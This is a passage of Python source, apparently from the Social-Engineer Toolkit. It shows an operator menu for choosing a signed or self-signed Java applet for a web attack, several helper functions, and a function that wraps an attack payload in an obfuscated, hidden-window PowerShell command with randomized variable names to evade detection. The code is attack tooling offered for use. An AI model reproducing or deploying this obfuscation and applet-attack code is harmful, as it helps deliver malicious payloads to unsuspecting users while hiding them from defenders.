Next we need to specify whether you will use your own self generated java applet, built in applet, or your own code signed java applet. In this section, you have all three options available. The first will create a self-signed certificate if you have the java jdk installed. The second option will use the one built into SET, and the third will allow you to import your own java applet OR code sign the one built into SET if you have a certificate.
Select which option you want:
1. Make my own self-signed certificate applet.
2. Use the applet built into SET.
3. I have my own code signing certificate or applet.\n""")

    choice1 = raw_input("Enter the number you want to use [1-3]: ")

    # use the default
    if choice1 == "":
        choice1 = "2"

    # make our own
    if choice1 == "1":
        try:
            import src.html.unsigned.self_sign
        except:
            module_reload(src.html.unsigned.self_sign)

    # if we need to use the built in applet
    if choice1 == "2":
        print_status(
            "Okay! Using the one built into SET - be careful, self signed isn't accepted in newer versions of Java :(")

    # if we want to build our own
    if choice1 == "3":
        try:
            import src.html.unsigned.verified_sign
        except:
            module_reload(src.html.unsigned.verified_sign)

# reload module function for python 2 and python 3


def module_reload(module):
    if sys.version_info >= (3, 0):
        import importlib
        importlib.reload(module)
    else:
        reload(module)

# used to replace any input that we have from python 2 to python 3


def input(string):
    return raw_input(string)

# fetch URL needed for web cloning


def fetch_template():
    fileopen = open(userconfigpath + "site.template").readlines()
    for line in fileopen:
        line = line.rstrip()
        match = re.search("URL=", line)
        if match:
            line = line.split("=")
            return line[1]


# tail a file
def tail(filename):
    if os.path.isfile(filename):
        file = open(filename, 'r')
        st_results = os.stat(filename)
        st_size = st_results[6]
        file.seek(st_size)

        while 1:
            where = file.tell()
            line = file.readline()
            if not line:
                time.sleep(1)
                file.seek(where)
            else:
                print(line,)  # already has newline

    else:
        print_error("File not found, cannot tail.")

# this will create an obfsucated powershell encoded command string to be
# used through SET
def powershell_encodedcommand(ps_attack):
    ran1 = generate_random_string(1, 2)
    ran2 = generate_random_string(1, 2)
    ran3 = generate_random_string(1, 2)
    ran4 = generate_random_string(1, 2)
    full_attack = ('powershell -w 1 -C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() \''.format(ran1, ran2, ran3, ran1, ran2, ran3) + ps_attack + '\'"')
    return full_attack
    # 'powershell -w 1 -C "sv %s -;sv %s ec;sv %s ((gv %s).value.toString()+(gv %s).value.toString());powershell (gv %s).value.toString() "' % (ran1, ran2, ran3, ran1, ran2, ran3)
